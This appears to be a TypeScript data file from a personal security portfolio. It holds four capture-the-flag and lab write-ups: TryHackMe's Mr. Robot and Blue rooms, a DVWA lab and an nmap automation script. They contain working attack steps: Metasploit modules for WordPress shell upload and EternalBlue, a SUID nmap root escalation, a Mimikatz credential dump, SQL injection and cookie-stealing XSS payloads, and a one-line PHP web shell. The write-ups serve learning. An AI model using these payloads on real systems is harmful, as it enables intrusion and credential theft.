export interface Writeup {
  id: string
  title: string
  platform: 'TryHackMe' | 'HackTheBox' | 'Personal Lab'
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Expert'
  category: 'Linux' | 'Windows' | 'Web' | 'Network' | 'Misc'
  tags: string[]
  description: string
  content: string
  date: string
  isLocked: boolean
}

export const writeups: Writeup[] = [
  {
    id: 'mr-robot',
    title: 'Mr. Robot Room',
    platform: 'TryHackMe',
    difficulty: 'Medium',
    category: 'Linux',
    tags: ['WordPress', 'Privilege Escalation', 'SUID', 'CTF'],
    description: 'Compromised a Linux machine inspired by the Mr. Robot series.',
    date: '2026',
    isLocked: false,
    content: `## Summary
This room is inspired by the Mr. Robot TV series. The goal is to find three hidden keys (flags) on the system.

## Reconnaissance
\`\`\`bash
nmap -sV -sC target_ip
\`\`\`

Open ports:
- 22/tcp - SSH
- 80/tcp - HTTP (WordPress)

## Web Enumeration
The website is running WordPress. Using wpscan to enumerate users:

\`\`\`bash
wpscan --url http://target_ip --enumerate u
\`\`\`

Found user: elliot

## Exploitation
The WordPress site has a vulnerable plugin. Using metasploit:

\`\`\`bash
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
\`\`\`

This gives us a shell as user 'daemon'.

## Privilege Escalation
Looking for SUID binaries:

\`\`\`bash
find / -perm -4000 2>/dev/null
\`\`\`

Found: /usr/local/bin/nmap has SUID bit set.

Using nmap to spawn a shell:
\`\`\`bash
/usr/local/bin/nmap --interactive
!sh
\`\`\`

Now we have root access and can retrieve all three flags.

## Lessons Learned
1. Always check for SUID binaries
2. Keep WordPress plugins updated
3. Don't use default credentials`,
  },
  {
    id: 'blue',
    title: 'Blue Room - EternalBlue',
    platform: 'TryHackMe',
    difficulty: 'Easy',
    category: 'Windows',
    tags: ['EternalBlue', 'MS17-010', 'Metasploit', 'Mimikatz'],
    description: 'Exploited the MS17-010 EternalBlue vulnerability on Windows 7.',
    date: '2026',
    isLocked: false,
    content: `## Summary
This room demonstrates the EternalBlue vulnerability (MS17-010) that affects Windows SMBv1.

## Reconnaissance
\`\`\`bash
nmap -sV target_ip
\`\`\`

Open ports:
- 135/tcp - MSRPC
- 139/tcp - NetBIOS
- 445/tcp - SMB (Vulnerable!)

## Exploitation
Using Metasploit:

\`\`\`bash
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
exploit
\`\`\`

We get a SYSTEM shell immediately!

## Post-Exploitation
Upgrading to Meterpreter:
\`\`\`bash
sessions -u 1
\`\`\`

Running Mimikatz to dump credentials:
\`\`\`bash
load kiwi
creds_all
\`\`\`

This reveals password hashes that can be cracked offline.

## Key Takeaways
- Unpatched systems are extremely vulnerable
- EternalBlue affects Windows 7/Server 2008 and earlier
- Always apply security updates promptly`,
  },
  {
    id: 'dvwa',
    title: 'DVWA Vulnerability Lab',
    platform: 'Personal Lab',
    difficulty: 'Easy',
    category: 'Web',
    tags: ['SQL Injection', 'XSS', 'CSRF', 'Burp Suite'],
    description: 'Practiced common web vulnerabilities on DVWA.',
    date: '2026',
    isLocked: false,
    content: `## Lab Setup
DVWA (Damn Vulnerable Web Application) is a PHP/MySQL web application that is intentionally vulnerable.

## SQL Injection
Testing for SQLi in the user ID field:

\`\`\`
1' OR '1'='1
\`\`\`

This returns all users from the database.

Union-based injection to get database version:
\`\`\`
1' UNION SELECT null, version() #
\`\`\`

## XSS (Cross-Site Scripting)
Stored XSS in the guestbook:
\`\`\`html
<script>alert(document.cookie)</script>
\`\`\`

## File Upload Vulnerability
Uploading a PHP shell disguised as an image:
\`\`\`
shell.php.jpg
\`\`\`

With content:
\`\`\`php
<?php system($_GET['cmd']); ?>
\`\`\`

## CSRF
Creating a malicious page that submits forms on behalf of authenticated users.

## Mitigations
- Use parameterized queries
- Sanitize user input
- Implement CSP headers
- Validate file uploads properly`,
  },
  {
    id: 'network-recon',
    title: 'Automated Network Scanner',
    platform: 'Personal Lab',
    difficulty: 'Medium',
    category: 'Network',
    tags: ['Python', 'Nmap', 'Automation', 'Scripting'],
    description: 'Python script combining Nmap with custom HTML reporting.',
    date: '2026',
    isLocked: false,
    content: `## Overview
Created a Python automation tool for network reconnaissance that combines Nmap scanning with custom HTML reporting.

## Features
- Multi-threaded scanning
- Service version detection
- Vulnerability checking
- HTML report generation
- CSV export option

## Code Structure
\`\`\`python
#!/usr/bin/env python3
import nmap
import argparse
from jinja2 import Template

def scan_target(target, ports):
    nm = nmap.PortScanner()
    nm.scan(target, ports, arguments='-sV -sC')
    return parse_results(nm)

def generate_report(results, output_file):
    template = Template(HTML_TEMPLATE)
    html = template.render(results=results)
    with open(output_file, 'w') as f:
        f.write(html)
\`\`\`

## Sample Output
The HTML report includes:
- Host status summary
- Open ports table
- Service versions
- Potential vulnerabilities
- Scan timestamps

## Usage
\`\`\`bash
python recon.py -t 192.168.1.0/24 -p 1-65535 -o report.html
\`\`\`

## Lessons Learned
- Python-nmap library simplifies automation
- Jinja2 templating makes report generation easy
- Threading improves scan performance significantly`,
  },
]

export const getWriteupById = (id: string): Writeup | undefined => {
  return writeups.find((w) => w.id === id)
}

export const filterWriteups = (
  filters: {
    platform?: string
    difficulty?: string
    category?: string
  }
): Writeup[] => {
  return writeups.filter((w) => {
    if (filters.platform && w.platform !== filters.platform) return false
    if (filters.difficulty && w.difficulty !== filters.difficulty) return false
    if (filters.category && w.category !== filters.category) return false
    return true
  })
}
